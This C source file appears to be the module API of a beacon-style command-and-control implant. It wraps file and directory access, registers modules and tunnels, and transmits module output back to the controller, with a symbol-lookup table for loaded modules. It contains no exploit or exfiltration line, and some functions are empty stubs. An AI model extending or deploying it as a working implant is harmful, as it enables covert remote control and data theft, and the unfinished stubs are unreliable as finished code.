#include "beaconAPI.h"
#include "common.h"
#include <stdarg.h>
#include "module.h"
#include "command.h"
#include "tunnel.h"

void beaconRegisterParameterInfo(char *option,char *name,char *description) //register parameter
{
    if(current_mod->module_parm_count >= MODULE_MAX_PARMS) return;

    current_mod->module_parms[current_mod->module_parm_count].option = option;
    current_mod->module_parms[current_mod->module_parm_count].name = name;
    current_mod->module_parms[current_mod->module_parm_count].description = description;

    current_mod->module_parm_count++;
}

void beaconRegisterDescription(char *description)
{
    current_mod->mod_description = description;
}


int beaconRegisterTunnel(void)
{
    struct tunnel *tunnel = tunnel_create();
    add_tunnel(tunnel);
    return tunnel->id;
}

int beaconUnregisterTunnel(int id)
{
    struct tunnel *tunnel = find_tunnel(id);
    if(tunnel == NULL) return -1;

    tunnel_destroy(tunnel);

    return 0;
}

size_t beaconTunnelRead(int id,char *buf,size_t size)
{

}

size_t beaconTunnelWrite(int id,char *buf,size_t size)
{

}

void beaconOutput(char* data, int len)
{
    int str_len = snprintf(NULL,0,"%s:\t%s",current_mod->name,data) + 10;
    char *str = malloc(str_len);
    memset(str,0,str_len);

    snprintf(str,str_len,"%s:\t%s",current_mod->name,data);
    
    struct packet_struct *packet = packet_create(COMMAND_DMESG);

    packet_add_uint32(packet, strlen(str));
    packet_add_bytes(packet, str, strlen(str));

    packet_transmit(current_mod->beaconInfo, packet);
    free(str);
}

void beaconPrintf(const char *format, ...)
{
    va_list args;
    int str_len = 0;

    va_start (args, format);
    str_len = vsnprintf(NULL, 0, format, args)+10;
    va_end(args);

    char *str = malloc(str_len);
    memset(str,0,str_len);

    va_start (args, format);
    vsnprintf(str, str_len, format, args);
    va_end(args);

    beaconOutput(str,strlen(str));

    free(str);
}

int beaconSnprintf(char *str,size_t size,const char *format,...)
{
    va_list args;
    va_start(args, format);

    vsnprintf(str,size,format,args);

    va_end(args);
}

void *beaconMalloc(size_t size)
{
    return malloc(size);
}
void beaconFree(void *buf)
{
    return free(buf);
}

int beaconOpen(const char *pathname,int flags)
{
    return open(pathname,flags);
}

ssize_t beaconRead(int fd,void *buf,size_t count)
{
    return read(fd,buf,count);
}

ssize_t beaconWrite(int fd,const void *buf,size_t count)
{
    return write(fd,buf,count);
}

int beaconClose(int fd)
{
    return close(fd);
}

DIR *beaconOpendir(const char *name)
{
    return opendir(name);
}

struct dirent *beaconReaddir(DIR *dirp)
{
    return readdir(dirp);
}

int beaconClosedir(DIR *dirp)
{
    return closedir(dirp);
}

FILE *beaconFopen(const char *pathname,const char *mode)
{
    return fopen(pathname,mode);
}

char* beaconFgets(char *s,int size,FILE *stream)
{
    return fgets(s,size,stream);
}

int beaconFclose(FILE *stream)
{
    return fclose(stream);
}

int beaconAtoi(const char *nptr)
{
    return atoi(nptr);
}

typedef struct beacon_function{
    char* functionName;
    void* function;
} beacon_function_t;

static beacon_function_t BeaconInternalMapping[] = {
    {"beaconOutput", (void*)beaconOutput},
    {"beaconPrintf", (void*)beaconPrintf},
    {"beaconSnprintf", (void*)beaconSnprintf},
    {"beaconMalloc", (void*)beaconMalloc},
    {"beaconFree", (void*)beaconFree},
    {"beaconOpen", (void*)beaconOpen},
    {"beaconRead", (void*)beaconRead},
    {"beaconWrite", (void*)beaconWrite},
    {"beaconClose", (void*)beaconClose},
    {"beaconOpendir", (void*)beaconOpendir},
    {"beaconReaddir", (void*)beaconReaddir},
    {"beaconClosedir", (void*)beaconClosedir},
    {"beaconFopen", (void*)beaconFopen},
    {"beaconFgets", (void*)beaconFgets},
    {"beaconFclose", (void*)beaconFclose},
    {"beaconAtoi", (void*)beaconAtoi},
    {"beaconRegisterParameterInfo",(void*)beaconRegisterParameterInfo},
    {"beaconRegisterDescription",(void*)beaconRegisterDescription},
};

void* internalFunctionLookup(char* symbolName){
    void* functionaddress = NULL;
    int tempcounter = 0;
    for (tempcounter = 0; tempcounter < ARRAY_SIZE(BeaconInternalMapping); tempcounter++){
        if (strcmp(symbolName, BeaconInternalMapping[tempcounter].functionName) == 0){
            DLX(6,printf("\t\t\t\tInternalFunction: %s\n", symbolName));
            functionaddress = BeaconInternalMapping[tempcounter].function;
            return functionaddress;
        }
    }
    /* If not an internal function, then its an external one */
    return functionaddress;
}